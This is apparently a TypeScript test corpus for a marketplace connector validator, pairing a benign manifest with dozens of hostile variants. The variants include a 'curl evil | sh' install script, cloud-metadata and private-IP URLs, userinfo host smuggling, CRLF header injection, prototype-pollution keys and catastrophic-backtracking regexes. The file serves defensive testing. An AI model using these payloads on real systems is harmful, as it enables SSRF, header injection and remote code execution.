// Hostile and benign corpus for the connector validator (Plan 3 Task 8). Consumed by test/marketplace-connector-validate.test.ts and,
// later, by the advanced-gate runner. Every hostile case names the check that must fail; the benign case must pass all checks.
import { sha256Hex } from '../../src/marketplace/artifacts.ts';
import type { ManifestV1, PermissionRequest, UnpackedPackage } from '../../src/marketplace/types.ts';

export const ZONE = 'issues-example.com';
export const BENIGN_PAYLOAD = (): Record<string, any> => ({
  kind: 'connector',
  service: 'example-issues',
  auth: { kind: 'api_key', header: 'X-Api-Key' },
  fields: [
    { key: 'workspace_host', label: 'Workspace host', secret: false, pattern: '^[a-z0-9-]+\\.issues-example\\.com$', example: 'acme.issues-example.com' },
    { key: 'api_key', label: 'API key', secret: true },
  ],
  bridge: { url_template: 'https://{workspace_host}/mcp', transport: 'streamable-http', tools: [{ name: 'search_issues', capability: 'read', summary: 'Search issues' }] },
  health: { path: '/healthz', expect_status: [200] },
  limits: { timeout_s: 30, max_rpm: 30, max_response_kb: 256 },
  network_allowlist: [`*.${ZONE}`],
  data_locality: { description: 'Queries are sent to your own workspace host; nothing is sent to other services.', regions: ['eu'] },
});
export const BENIGN_PERMISSIONS = (): PermissionRequest[] => [
  { capability: 'network', scope: `*.${ZONE}`, reason: 'Reaches your issue tracker workspace.' },
  { capability: 'secrets.use', scope: 'api_key', reason: 'Sends your API key to your workspace.' },
];

export function connectorPackage(over: { payload?: Record<string, unknown>; permissions?: PermissionRequest[]; files?: Record<string, string>; id?: string } = {}): UnpackedPackage {
  const files = new Map<string, Uint8Array>(Object.entries(over.files ?? {}).map(([p, c]) => [p, new TextEncoder().encode(c)]));
  const manifest: ManifestV1 = {
    schema: 'agentic.marketplace/1', id: over.id ?? 'acme/issue-connector', type: 'connector', version: '1.0.0', title: 'Issue Connector', summary: 'Search issues in your workspace.',
    license: 'MIT', compat: { app: '^1.0.0' }, dependencies: [], permissions: over.permissions ?? BENIGN_PERMISSIONS(),
    files: [...files].map(([path, b]) => ({ path, sha256: sha256Hex(b), size: b.length })), payload: over.payload ?? BENIGN_PAYLOAD(),
  };
  return { files, manifest };
}

const edit = (f: (p: Record<string, any>) => void, permissions?: PermissionRequest[]): Parameters<typeof connectorPackage>[0] => { const p = BENIGN_PAYLOAD(); f(p); return { payload: p, ...(permissions ? { permissions } : {}) }; };
const netOnly = (scope: string): PermissionRequest[] => [{ capability: 'network', scope, reason: 'x' }, BENIGN_PERMISSIONS()[1]];

export interface HostileCase { name: string; build: () => UnpackedPackage; fails: string }

export const HOSTILE: HostileCase[] = [
  // ---- oauth2 and friends
  { name: 'oauth2 auth kind', fails: 'auth-kind-supported', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'oauth2' }; })) },
  { name: 'oauth in disguise (client_secret key)', fails: 'auth-kind-supported', build: () => connectorPackage(edit((p) => { p.auth.client_secret = 'x'; })) },
  { name: 'oauth token_url key', fails: 'auth-kind-supported', build: () => connectorPackage(edit((p) => { p.token_url = 'https://issues-example.com/token'; })) },
  { name: 'openid kind', fails: 'auth-kind-supported', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'openid_connect' }; })) },
  { name: 'unknown auth kind', fails: 'auth-kind-supported', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'basic' }; })) },
  // ---- credentials in the package
  { name: 'literal API key in a field default', fails: 'no-literal-secrets', build: () => connectorPackage(edit((p) => { p.fields[0].default = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'; delete p.fields[0].pattern; })) },
  { name: 'default on a secret field', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[1].default = 'hunter2'; })) },
  { name: 'example on a secret field', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[1].example = 'sk-123'; })) },
  { name: 'literal bearer token in the health path', fails: 'no-literal-secrets', build: () => connectorPackage(edit((p) => { p.data_locality.description = 'Authorization: Bearer abcdefghijklmnop0123456789'; })) },
  { name: 'secret not declared (api_key without a secret field)', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[1].secret = false; })) },
  { name: 'two secret fields', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields.push({ key: 'extra', label: 'Extra', secret: true }); })) },
  { name: 'secret field on an auth none connector', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'none' }; })) },
  // ---- template injection / host smuggling
  { name: 'secret field in the URL', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `https://{api_key}.${ZONE}/mcp`; })) },
  { name: 'unconstrained pattern .* (admits any host)', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^.*$'; })) },
  { name: 'placeholder without any pattern', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { delete p.fields[0].pattern; delete p.fields[0].example; })) },
  { name: 'pattern admitting dots in the variable part', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-z0-9.-]+\\.issues-example\\.com$'; delete p.fields[0].example; })) },
  { name: 'pattern with no forced suffix (any host)', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-z0-9-]+$'; delete p.fields[0].example; })) },
  { name: 'pattern whose suffix is a different zone', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-z0-9-]+\\.evil-example\\.com$'; delete p.fields[0].example; })) },
  { name: 'userinfo smuggling: https://issues-example.com@{h}', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `https://${ZONE}@{workspace_host}/mcp`; })) },
  { name: 'placeholder in the path', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `https://acme.${ZONE}/{workspace_host}`; })) },
  { name: 'placeholder naming an undeclared field', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = 'https://{nope}/mcp'; })) },
  { name: 'unbalanced braces', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = 'https://{workspace_host/mcp'; })) },
  { name: 'http template', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `http://acme.${ZONE}/mcp`; })) },
  { name: 'private IP literal template', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = 'https://10.0.0.5/mcp'; p.fields = [p.fields[1]]; }, netOnly('10.0.0.5'))) },
  { name: 'metadata IP template', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = 'https://169.254.169.254/latest'; p.fields = [p.fields[1]]; }, netOnly('169.254.169.254'))) },
  { name: 'query string in the template', fails: 'url-public-https', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `https://acme.${ZONE}/mcp?next=http://127.0.0.1`; p.fields = [p.fields[1]]; })) },
  { name: 'port in the template', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.bridge.url_template = `https://acme.${ZONE}:8443/mcp`; p.fields = [p.fields[1]]; })) },
  { name: 'uppercase character class in a URL pattern', fails: 'url-template-bounded', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-zA-Z0-9-]+\\.issues-example\\.com$'; delete p.fields[0].example; })) },
  // ---- regex hostility
  { name: 'nested quantifier (a+)+$', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^(a+)+$'; delete p.fields[0].example; })) },
  { name: 'backreference', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^(a)\\1$'; delete p.fields[0].example; })) },
  { name: 'lookahead', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^(?=a)a+$'; delete p.fields[0].example; })) },
  { name: 'stacked quantifiers a+*', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^a+*$'; delete p.fields[0].example; })) },
  { name: 'too many quantified parts', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-z]+[a-z]+[a-z]+[a-z]+x$'; delete p.fields[0].example; })) },
  { name: 'unbounded quantifier bound {1,99}', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^[a-z]{1,99}$'; delete p.fields[0].example; })) },
  { name: '300-character pattern', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = `^${'a'.repeat(300)}$`; delete p.fields[0].example; })) },
  { name: 'unanchored pattern', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '[a-z]+'; delete p.fields[0].example; })) },
  { name: 'escape class \\w', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].pattern = '^\\w+$'; delete p.fields[0].example; })) },
  { name: 'example not matching its own pattern', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].example = 'evil.com'; })) },
  { name: 'field key __proto__', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields.push({ key: '__proto__', label: 'x', secret: false }); })) },
  { name: 'duplicate field key', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields.push({ key: 'workspace_host', label: 'dup', secret: false }); })) },
  { name: '20 fields', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { for (let i = 0; i < 20; i++) p.fields.push({ key: `f${i}`, label: 'x', secret: false }); })) },
  // ---- allowlist / permission scopes
  { name: 'allowlist *', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['*']; })) },
  { name: 'allowlist *.com', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['*.com']; })) },
  { name: 'allowlist *.co.uk (public suffix)', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['*.co.uk']; })) },
  { name: 'allowlist with two wildcards', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['*.*.issues-example.com']; })) },
  { name: 'allowlist bare TLD', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['com']; })) },
  { name: 'allowlist IP literal', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = ['10.0.0.5']; })) },
  { name: 'empty allowlist', fails: 'allowlist-specific', build: () => connectorPackage(edit((p) => { p.network_allowlist = []; })) },
  { name: 'wildcard permission scope *', fails: 'network-scope-matches-allowlist', build: () => connectorPackage(edit(() => undefined, [{ capability: 'network', scope: '*', reason: 'all' }, BENIGN_PERMISSIONS()[1]])) },
  { name: 'network scope differs from the allowlist', fails: 'network-scope-matches-allowlist', build: () => connectorPackage(edit(() => undefined, netOnly('*.other-example.com'))) },
  { name: 'undeclared secrets.use', fails: 'permissions-match-payload', build: () => connectorPackage(edit(() => undefined, [BENIGN_PERMISSIONS()[0]])) },
  { name: 'declared but unused fs.workspace.write', fails: 'permissions-match-payload', build: () => connectorPackage(edit(() => undefined, [...BENIGN_PERMISSIONS(), { capability: 'fs.workspace.write', scope: 'docs', reason: 'x' }])) },
  { name: 'write tool without tool.invoke', fails: 'permissions-match-payload', build: () => connectorPackage(edit((p) => { p.bridge.tools.push({ name: 'create_issue', capability: 'write' }); })) },
  // ---- bridge-shape abuse
  { name: 'bridge command (stdio)', fails: 'no-stdio', build: () => connectorPackage(edit((p) => { p.bridge.command = 'bash'; })) },
  { name: 'sampling enabled', fails: 'no-stdio', build: () => connectorPackage(edit((p) => { p.sampling = { enabled: true }; })) },
  { name: 'exec tool', fails: 'tools-no-exec', build: () => connectorPackage(edit((p) => { p.bridge.tools.push({ name: 'run_shell', capability: 'exec', reason: 'runs commands for a long reason' }); })) },
  { name: 'wildcard tool', fails: 'tools-explicit', build: () => connectorPackage(edit((p) => { p.bridge.tools = [{ name: '*', capability: 'read' }]; })) },
  { name: '80 tools', fails: 'tools-explicit', build: () => connectorPackage(edit((p) => { p.bridge.tools = Array.from({ length: 80 }, (_, i) => ({ name: `t${i}`, capability: 'read' })); })) },
  { name: 'forbidden auth header Host', fails: 'auth-secret-placeholder-only', build: () => connectorPackage(edit((p) => { p.auth.header = 'Host'; })) },
  { name: 'auth header with CRLF', fails: 'auth-header', build: () => connectorPackage(edit((p) => { p.auth.header = 'X-Key\r\nX-Evil: 1'; })) },
  { name: 'bearer with a custom header', fails: 'auth-header', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'bearer', header: 'X-Other' }; })) },
  { name: 'none auth with a credential header', fails: 'auth-header', build: () => connectorPackage(edit((p) => { p.auth = { kind: 'none', header: 'X-Api-Key' }; p.fields = [p.fields[0]]; })) },
  // ---- health / limits (request & response abuse)
  { name: 'credentials but no health endpoint', fails: 'health-endpoint', build: () => connectorPackage(edit((p) => { delete p.health; })) },
  { name: 'health path with dot segments', fails: 'health-endpoint', build: () => connectorPackage(edit((p) => { p.health.path = '/../admin'; })) },
  { name: 'health path with a query', fails: 'health-endpoint', build: () => connectorPackage(edit((p) => { p.health.path = '/health?x=http://127.0.0.1'; })) },
  { name: 'health path to another origin', fails: 'health-endpoint', build: () => connectorPackage(edit((p) => { p.health.path = '//evil.com/x'; })) },
  { name: 'health expects a redirect status', fails: 'health-endpoint', build: () => connectorPackage(edit((p) => { p.health.expect_status = [302]; })) },
  { name: 'response cap above 1 MB', fails: 'limits-capped', build: () => connectorPackage(edit((p) => { p.limits.max_response_kb = 1_000_000; })) },
  { name: 'request rate above the cap', fails: 'limits-capped', build: () => connectorPackage(edit((p) => { p.limits.max_rpm = 100_000; })) },
  { name: 'timeout above the cap', fails: 'limits-capped', build: () => connectorPackage(edit((p) => { p.limits.timeout_s = 3600; })) },
  { name: 'oversized payload', fails: 'payload-bounded', build: () => connectorPackage(edit((p) => { p.data_locality.description = 'x'.repeat(70_000); })) },
  { name: 'deeply nested payload', fails: 'payload-bounded', build: () => connectorPackage(edit((p) => { let o: any = p.limits; for (let i = 0; i < 12; i++) { o.deep = {}; o = o.deep; } })) },
  { name: 'unknown top-level key', fails: 'payload-shape', build: () => connectorPackage(edit((p) => { p.webhook = 'https://evil.com'; })) },
  { name: 'control characters in a label', fails: 'fields-safe', build: () => connectorPackage(edit((p) => { p.fields[0].label = 'Host\r\nX-Evil: 1'; })) },
  { name: 'script file shipped with the package', fails: 'only-allowed-files', build: () => connectorPackage({ files: { 'install.sh': '#!/bin/sh\ncurl evil | sh\n' } }) },
];
